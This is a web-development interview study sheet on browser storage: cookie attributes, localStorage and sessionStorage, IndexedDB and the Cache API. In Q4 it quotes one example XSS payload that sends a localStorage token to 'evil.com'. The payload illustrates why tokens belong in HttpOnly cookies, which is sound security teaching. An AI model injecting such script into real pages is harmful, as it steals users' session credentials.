SECTION 1: COOKIES
────────────────────────────────────────────────────────────────────────────────

Q1: What are cookies and what are they used for?
─────────────────────────────────────────────────
Answer:
  Cookies are small key-value data fragments (up to 4KB) stored by the browser
  and automatically sent with HTTP requests to the matching domain.
  
  Use cases:
  • Session management (user authentication, login state)
  • Server-side personalization (user preferences sent to server)
  • Tracking and analytics (third-party cookies)
  
  Key attributes: Expires/Max-Age, Domain, Path, Secure, HttpOnly, SameSite.

Q2: What is the difference between HttpOnly and Secure cookie attributes?
──────────────────────────────────────────────────────────────────────────
Answer:
  HttpOnly: Cookie is inaccessible to JavaScript (document.cookie doesn't
  include it). Prevents XSS attacks from stealing session cookies.
  Only the browser sends it with HTTP requests automatically.
  
  Secure: Cookie is only transmitted over HTTPS connections.
  Prevents transmission over unencrypted HTTP channels (man-in-the-middle).
  
  Best practice for auth cookies: Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax

Q3: Explain the SameSite cookie attribute and its values.
──────────────────────────────────────────────────────────
Answer:
  SameSite controls when cookies are sent with cross-site requests:
  
  Strict: Only sent for same-site requests. Never on cross-site navigation.
    Most secure; can break user experience (user not logged in when arriving from search).
  
  Lax (modern default since Chrome 80): Sent for same-site + top-level GET
    cross-site navigations. NOT sent on cross-site POST, AJAX, or iframe loads.
    Good balance: prevents CSRF while keeping normal navigation working.
  
  None: Sent with all cross-site requests. Must be accompanied by Secure.
    Needed for third-party cookies and embedded content.
  
  CSRF mitigation: SameSite=Lax/Strict prevents the cookie from being sent
  with cross-site POST/AJAX requests that CSRF exploits.

Q4: Where should you store authentication tokens — cookies or localStorage?
─────────────────────────────────────────────────────────────────────────────
Answer:
  Recommended: HttpOnly Secure SameSite=Strict cookie.
  
  Why cookies are better for auth:
  • HttpOnly: JS can't access it — XSS can't steal the token
  • Secure: HTTPS only
  • SameSite: reduces CSRF risk
  • Automatically sent with requests — no manual header setting
  
  Problems with localStorage for auth tokens:
  • Accessible to any JS on the page — XSS can read and steal tokens
  • Attacker injects <script>fetch('evil.com?t=' + localStorage.token)</script>
  
  If you must use localStorage (e.g., for non-browser clients):
  • Keep tokens short-lived
  • Store only access tokens in memory (not localStorage)
  • Use refresh tokens in HttpOnly cookies

SECTION 2: localStorage / sessionStorage
────────────────────────────────────────────────────────────────────────────────

Q5: What is the difference between localStorage and sessionStorage?
─────────────────────────────────────────────────────────────────────
Answer:
  localStorage:
  • Persists indefinitely (until explicitly cleared)
  • Shared across all tabs of the same origin
  • Survives browser restarts
  • Fires 'storage' event in OTHER tabs when modified
  • ~5-10MB capacity
  
  sessionStorage:
  • Cleared when the tab/window closes
  • Scoped to the current tab only
  • Tab duplication copies sessionStorage at time of duplication (then independent)
  • Does not share across tabs
  • ~5MB capacity
  
  Both: synchronous API, string values only, same-origin scoped.

Q6: How can you communicate between browser tabs using storage?
────────────────────────────────────────────────────────────────
Answer:
  localStorage + storage event:
  
  // Tab A: trigger change
  localStorage.setItem('logout', Date.now().toString());
  
  // Tab B: listen for changes
  window.addEventListener('storage', (event) => {
    if (event.key === 'logout') {
      // Another tab triggered logout
      window.location.href = '/login';
    }
  });
  
  The 'storage' event fires in ALL OTHER tabs of the same origin (not the one
  that made the change). sessionStorage changes don't fire in other tabs.
  
  Alternatives:
  • BroadcastChannel API (modern, explicit):
    const channel = new BroadcastChannel('app-events');
    channel.postMessage({ type: 'logout' });
    channel.onmessage = (e) => console.log(e.data);
  • SharedWorker

Q7: What happens when localStorage quota is exceeded?
───────────────────────────────────────────────────────
Answer:
  setItem() throws a QuotaExceededError (a DOMException).
  
  try {
    localStorage.setItem('data', largeString);
  } catch (e) {
    if (e.name === 'QuotaExceededError' || e.name === 'NS_ERROR_DOM_QUOTA_REACHED') {
      // Handle: clear old data, notify user, or use IndexedDB
      localStorage.removeItem('cache'); // clear some space
    }
  }
  
  Check available quota:
  const { quota, usage } = await navigator.storage.estimate();

SECTION 3: IndexedDB
────────────────────────────────────────────────────────────────────────────────

Q8: When would you use IndexedDB over localStorage?
─────────────────────────────────────────────────────
Answer:
  Use IndexedDB when:
  • Data exceeds 5MB (IndexedDB can use gigabytes)
  • You need structured querying (indexes, range queries)
  • You need to store binary data (Blobs, ArrayBuffers, Files)
  • You need async non-blocking operations (localStorage is synchronous)
  • You're building a PWA with offline data
  • Access is needed from Web Workers or Service Workers (no localStorage there)
  
  Use localStorage for:
  • Simple key-value, small amounts of data
  • Synchronous access is acceptable
  • No need for querying

Q9: What is a transaction in IndexedDB and why does it matter?
────────────────────────────────────────────────────────────────
Answer:
  A transaction groups operations that must all succeed or all fail.
  All reads and writes happen within a transaction.
  
  Modes:
  • 'readonly': allows concurrent reads
  • 'readwrite': exclusive write access
  
  Transactions auto-commit when all their pending requests complete.
  Transactions auto-abort on error.
  
  Why it matters:
  • Data integrity — no partial updates
  • If step 1 of 3 succeeds but step 2 fails, everything rolls back
  • Prevents corruption in multi-step operations (e.g., debit + credit)
  
  Caution: Transactions expire if no new requests are made (don't await
  unrelated async operations inside a live transaction).

Q10: Explain the IndexedDB schema migration process.
──────────────────────────────────────────────────────
Answer:
  Schema changes in IndexedDB require incrementing the database version.
  When indexedDB.open(name, newVersion) is called with a higher version:
  
  1. onblocked fires if old version is still open in another tab.
  2. Old connection must close (via versionchange event or page reload).
  3. onupgradeneeded fires with event.oldVersion and event.newVersion.
  4. Inside onupgradeneeded: create/delete objectStores and indexes.
  5. onsuccess fires with the new database connection.
  
  Incremental migrations:
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      if (event.oldVersion < 1) {
        db.createObjectStore('users', { keyPath: 'id', autoIncrement: true });
      }
      if (event.oldVersion < 2) {
        const store = event.target.transaction.objectStore('users');
        store.createIndex('email', 'email', { unique: true });
      }
      if (event.oldVersion < 3) {
        db.createObjectStore('products', { keyPath: 'sku' });
      }
    };

SECTION 4: CACHE API
────────────────────────────────────────────────────────────────────────────────

Q11: What is the Cache API and how does it differ from the HTTP cache?
───────────────────────────────────────────────────────────────────────
Answer:
  Cache API: Developer-controlled storage of Request/Response pairs.
  Used in Service Workers to implement custom offline caching strategies.
  
  HTTP cache: Browser-managed cache based on HTTP headers (Cache-Control, ETag).
  Developer hints but doesn't fully control when resources are served from cache.
  
  Key differences:
  • Cache API: explicit control, custom logic, offline-first strategies possible
  • HTTP cache: automatic, driven by server headers
  • Cache API persists until explicitly deleted; HTTP cache can be overridden by headers
  • Cache API is accessible to Service Workers; HTTP cache is not directly accessible
  • Cache API stores full Request/Response pairs; HTTP cache is transparent to JS

Q12: Why do you need to clone a Response before caching it?
─────────────────────────────────────────────────────────────
Answer:
  Response bodies are streams — they can only be consumed ONCE.
  If you pass the response to the browser AND try to cache it, one will get
  an empty body.
  
  // WRONG:
  const response = await fetch(request);
  cache.put(request, response); // consumes stream
  return response; // empty body!
  
  // CORRECT:
  const response = await fetch(request);
  const clone = response.clone(); // independent copy
  cache.put(request, clone); // store clone
  return response; // return original to browser

================================================================================
  KEY TAKEAWAYS
================================================================================
  • Auth tokens → HttpOnly Secure SameSite cookie; avoid localStorage for tokens
  • localStorage: persistent, cross-tab, ~5MB, sync; sessionStorage: tab-scoped
  • storage event: cross-tab communication via localStorage changes
  • IndexedDB: async, large, indexed, binary, worker-accessible; complex API
  • Cache API: Request/Response pairs; custom offline strategies; clone before caching
  • Transaction: all-or-nothing operations; auto-commit on last request completion
================================================================================
